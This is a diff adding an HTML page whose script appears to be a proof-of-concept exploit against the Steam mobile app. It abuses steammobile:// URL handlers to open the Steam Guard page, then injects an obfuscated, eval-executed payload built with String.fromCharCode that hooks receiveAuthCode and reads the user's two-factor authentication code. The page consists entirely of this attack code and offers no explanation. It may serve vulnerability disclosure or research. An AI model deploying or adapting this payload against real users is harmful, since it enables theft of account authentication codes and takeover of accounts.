@@ -1,0 +1,17 @@
+<html>
+<body>
+<script>
+setTimeout(function() {
+    var payload = "\'receiveAuthCode=alert;setTimeout(function()\'+String.fromCharCode(0x7b)+\'location.href=\'+String.fromCharCode(0x22)+\'steammobile://twofactorcode?gid=\'+String.fromCharCode(0x22)+\'+g_iosCallData;\'+String.fromCharCode(0x7d)+String.fromCharCode(0x2c)+\'3000);setTimeout(function()\'+String.fromCharCode(0x7b)+\'alert(g_iosCallData)\'+String.fromCharCode(0x7d)+String.fromCharCode(0x2c)+\'6000);location.href=\'+String.fromCharCode(0x22)+\'steammobile://steamguardgetgid\'+String.fromCharCode(0x22)";
+    payload = 'eval(decodeURIComponent('+payload+'))';
+    var url = 'steammobile://openurl?url=steammobile://closethis?call='+payload;
+    location = url;
+},3000);
+
+setTimeout(function() {
+	location = "steammobile://openmodalurl?url=https://steamcommunity.com/steamguard/";
+}, 1000);
+
+</script>
+</body>
+</html>
